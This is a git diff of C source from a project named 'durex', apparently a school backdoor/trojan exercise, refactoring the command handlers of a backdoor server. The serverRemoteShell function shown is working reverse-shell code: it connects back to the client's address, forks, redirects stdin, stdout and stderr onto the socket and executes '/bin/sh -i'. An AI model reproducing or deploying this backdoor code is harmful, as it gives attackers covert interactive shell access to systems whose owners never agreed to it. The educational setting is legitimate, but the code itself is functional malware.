@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/16 23:22:39 by root              #+#    #+#             */
-/*   Updated: 2018/08/17 21:03:32 by root             ###   ########.fr       */
+/*   Updated: 2018/08/18 15:38:53 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -18,7 +18,7 @@
 
 #include "durex.h"
 
-void			serverHelp(t_cl *client, t_cmd *cmds)
+void				serverHelp(t_cl *client, t_cmd *cmds)
 {
 	serverLog("[CMDS] - %d: Help wanted.", client->fd);
 	for (size_t i = 0; cmds[i].name; i++) {
@@ -29,9 +29,9 @@ void			serverHelp(t_cl *client, t_cmd *cmds)
 	}
 }
 
-void			serverShell(t_cl *client, t_cmd *cmds)
+void				serverShell(t_cl *client, t_cmd *cmds)
 {
-	pid_t		pid;
+	pid_t			pid;
 
 	(void)cmds;
 	serverLog("[CMDS] - %d: Shell wanted.", client->fd);
@@ -55,15 +55,14 @@ void			serverShell(t_cl *client, t_cmd *cmds)
 
 void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 {
-	pid_t			pid;
 	struct addrinfo	*res;
 	struct addrinfo	hints;
 	struct addrinfo	*tmp;
 	int				fd;
+	pid_t			pid;
 
-	(void)cmds;
 	serverLog("[CMDS] - %d: Reverse Shell wanted.", client->fd);
-	clientWrite("Spawning reverse remote shell...\n", client);
+	clientWrite("Spawning reverse shell...\n", client);
 	mymemset(&hints, 0, sizeof(hints));
 	hints.ai_flags = AI_PASSIVE;
 	hints.ai_family = AF_UNSPEC;
@@ -72,7 +71,7 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 	hints.ai_canonname = NULL;
 	hints.ai_addr = NULL;
 	hints.ai_next = NULL;
-	if ((fd = getaddrinfo(client->addr, "4243", &hints, &res))) {
+	if ((fd = getaddrinfo(client->addr, SERVER_REMOTE_PORT, &hints, &res))) {
 		clientWrite("Failed to connect to server.\n", client);
 		return serverLog("[ERRO] - %s", gai_strerror(fd));
 	}
@@ -89,34 +88,36 @@ void				serverRemoteShell(t_cl *client, t_cmd *cmds)
 		tmp = tmp->ai_next;
 	}
 	freeaddrinfo(res);
-	serverLog("[INFO] - fd:%d tmp:%s", fd, (tmp == NULL) ? "OK":"KO");
 	if (tmp == NULL || fd < 0) {
-		clientWrite("No server found on port 4243.\n", client);
+		clientWrite("No server found.\n", client);
 		if (!tmp)
 			serverLog("[ERRO] - Failed to connect to %s:%s (No server found)",
-					  client->addr, "4243");
+					  client->addr, SERVER_REMOTE_PORT);
 		else
 			serverLog("[ERRO] - %s", strerror(errno));
 		return ;
 	}
-	serverLog("[CMDS] - Connection to %s on %s succeeded.", client->addr, "4243");
-	close(client->fd);
-	client->fd = fd;
+	serverLog("[CMDS] - Connection to %s on %s succeeded.", client->addr, SERVER_REMOTE_PORT);
 	pid = fork();
 	if (pid < 0)
 		clientWrite("Failed to fork a new shell\n", client);
-	else if (pid == 0) {
+	else if (pid > 0)
+		serverQuitClient(client, cmds);
+	else {
 		char		*cmd[3];
-		
-		dup2(client->fd, STDIN_FILENO);
-		dup2(client->fd, STDOUT_FILENO);
-		dup2(client->fd, STDERR_FILENO);
+
+		close(client->fd);
+		client->fd = -1;
+		dup2(fd, STDIN_FILENO);
+		dup2(fd, STDOUT_FILENO);
+		dup2(fd, STDERR_FILENO);
 		cmd[0] = "/bin/sh";
 		cmd[1] = "-i";
 		cmd[2] = NULL;
 		execv(cmd[0], cmd);
 		exit(0);
 	}
+	close(fd);
 }
 
 void			serverQuitClient(t_cl *client, t_cmd *cmds)
